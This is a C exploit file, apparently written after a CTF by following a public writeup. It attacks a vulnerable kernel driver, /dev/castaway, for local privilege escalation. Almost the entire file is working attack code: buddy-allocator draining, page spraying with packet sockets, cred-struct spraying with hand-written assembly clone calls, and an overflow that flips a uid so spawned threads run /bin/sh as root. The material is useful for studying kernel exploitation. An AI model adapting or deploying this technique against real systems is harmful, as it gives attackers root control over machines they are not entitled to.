/*
This was done long time after the CTF is over.
I wrote this while closely following the author's writeup
(https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html)
so there is stolen code.
*/

#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define CHUNK_SIZE 512
#define ALLOC_IOCTL 0xcafebabe
#define EDIT_IOCTL 0xf00dbabe
#define COMM_SPRAY_SIZE 0x100
#define CRED_DRAIN_SIZE 0x100
#define FORK_SPRAY 300
#define VULN_SPRAY 300

static size_t idx;
static int sprayfd_child[2];
static int sprayfd_parent[2];
static int rootfd[2];

static int sockfds[COMM_SPRAY_SIZE];

struct user_req_t {
  int64_t idx;
  uint64_t size;
  char *buf;
};

enum spray_order {
  ALLOC,
  FREE,
  EXIT,
};

enum creds {
  USER,
  ROOT,
};

struct spray_req_t {
  enum spray_order order;
  uint32_t index;
};

// returns the index of the allocations
static long add(int fd) { return ioctl(fd, ALLOC_IOCTL, NULL); }

static int edit(int fd, int64_t idx, uint64_t size, char *buf) {
  struct user_req_t req = {
      .idx = idx,
      .size = size,
      .buf = buf,
  };

  return ioctl(fd, EDIT_IOCTL, &req);
}

static int unshare_sandbox() {
  return unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
  // maybe need to hardcode calling uig and gid in {uid, gid}_maps
}

static uint32_t alloc_page(size_t size) {
  struct tpacket_req req;
  int32_t socketfd, version;

  socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
  if (socketfd < 0) {
    perror("bad socket");
    exit(-1);
  }

  version = TPACKET_V1;

  if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version,
                 sizeof(version)) < 0) {
    perror("setsockopt PACKET_VERSION failed");
    exit(-1);
  }

  assert(size % 4096 == 0);

  memset(&req, 0, sizeof(req));

  req.tp_block_size = size;
  req.tp_block_nr = 1;
  req.tp_frame_size = 4096;
  req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

  if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0) {
    perror("setsockopt PACKET_TX_RING failed");
    exit(-1);
  }

  return socketfd;
}

static int setup_spray_comm() {
  struct spray_req_t req;
  int ret;

  do {
    read(sprayfd_child[0], &req, sizeof(req));

    switch (req.order) {
    case ALLOC:
      sockfds[req.index] = alloc_page(0x1000);
      break;
    case FREE:
      close(sockfds[req.index]);
      break;
    default:
      return -1;
    }
    write(sprayfd_parent[1], &req.index, sizeof(req.index));
  } while (req.order != EXIT);

  return 0;
}

struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
char throwaway;
char root[] = "root\n";
char binsh[] = "/bin/sh\x00";
char *args[] = {"/bin/sh", NULL};

__attribute__((naked)) void check_and_wait() {
  asm("lea rax, [rootfd];"
      "mov edi, dword ptr [rax];"
      "lea rsi, [throwaway];"
      "mov rdx, 1;"
      "xor rax, rax;"
      "syscall;"
      "mov rax, 102;"
      "syscall;"
      "cmp rax, 0;"
      "jne finish;"
      "mov rdi, 1;"
      "lea rsi, [root];"
      "mov rdx, 5;"
      "mov rax, 1;"
      "syscall;"
      "lea rdi, [binsh];"
      "lea rsi, [args];"
      "xor rdx, rdx;"
      "mov rax, 59;"
      "syscall;"
      "finish:"
      "lea rdi, [timer];"
      "xor rsi, rsi;"
      "mov rax, 35;"
      "syscall;"
      "ret;");
}

// https://man7.org/linux/man-pages/man2/clone.2.html
__attribute__((naked)) pid_t __clone(uint64_t flags, void *dest) {
  asm("mov r15, rsi;"
      "xor rsi, rsi;"
      "xor rdx, rdx;"
      "xor r10, r10;"
      "xor r9, r9;"
      "mov rax, 56;"
      "syscall;"
      "cmp rax, 0;"
      "jl bad_end;"
      "jg good_end;"
      "jmp r15;"
      "bad_end:"
      "neg rax;"
      "ret;"
      "good_end:"
      "ret;");
}

int main(void) {
  int fd, ret;

  fd = open("/dev/castaway", O_RDWR);
  assert(fd > 0);

  pipe(sprayfd_child);
  pipe(sprayfd_parent);
  pipe(rootfd);

  if (!fork()) {
    unshare_sandbox();
    setup_spray_comm();
  }

  /*
   * we now start heap shaping
   * the goal is now to have a series of adjacent vuln object and cred struct
   * through adjacent pages (remeber, vuln and cred objects are in differents
   * caches)
   */

  /*
   * drain cred_jar
   * we need to drain all order > 0 free entries from the buddy allocator
   * to be sure that the following page allocation will be taken from order-0
   */
  puts("[+] Draining order 0 buddy pages");
  for (int i = 0; i < CRED_DRAIN_SIZE; i++) {
    pid_t p = fork();
    assert(p >= 0);

    // need to leave the child running
    if (!p) {
      sleep(1000000);
    }
  }

  // spray order-0 pages
  puts("[+] Starting spraying pages");
  for (idx = 0; idx < COMM_SPRAY_SIZE; idx++) {
    uint32_t result;

    struct spray_req_t req = {
        .index = idx,
        .order = ALLOC,
    };

    write(sprayfd_child[1], &req, sizeof(req));
    read(sprayfd_parent[0], &result, sizeof(result));
    assert(result == idx);
  }

  /*
   * free 1 page out of 2, that will be reallocated when reqesting a
   * cred struct (when fork() or clone())
   */
  puts("[+] Freeing 1 page out of 2");
  for (idx = 1; idx < COMM_SPRAY_SIZE; idx += 2) {
    uint32_t result;

    struct spray_req_t req = {
        .index = idx,
        .order = FREE,
    };

    write(sprayfd_child[1], &req, sizeof(req));
    read(sprayfd_parent[0], &result, sizeof(result));
    assert(result == idx);
  }

  puts("[+] Spraying cred structs");
  for (int i = 0; i < FORK_SPRAY; i++) {
    int tid;
    tid = __clone(CLONE_FILES | CLONE_VM | CLONE_FS | CLONE_SIGHAND,
                  &check_and_wait);
    assert(tid >= 0);
  }

  /*
   * We now free the remaining 1 out of 2 pages, and replace them with a
   * object.
   */
  puts("[+] Freeing the remaining pages");
  for (idx = 0; idx < COMM_SPRAY_SIZE; idx += 2) {
    uint32_t result;

    struct spray_req_t req = {
        .index = idx,
        .order = FREE,
    };
    
    write(sprayfd_child[1], &req, sizeof(req));
    read(sprayfd_parent[0], &result, sizeof(result));
    assert(result == idx);
  }
  
  for (idx = 0; idx < VULN_SPRAY; idx++) {
    add(fd);
  }

  for (idx = 0; idx < VULN_SPRAY; idx++) {
    char pwn[CHUNK_SIZE] = {0};
    pwn[CHUNK_SIZE-6] = '\x01';
    edit(fd, idx, CHUNK_SIZE, pwn);
  }

  puts("[+] Sending signal to childs");
  char bar[FORK_SPRAY];
  write(rootfd[1], &bar, FORK_SPRAY);

  sleep(10000);

  return 0;
}
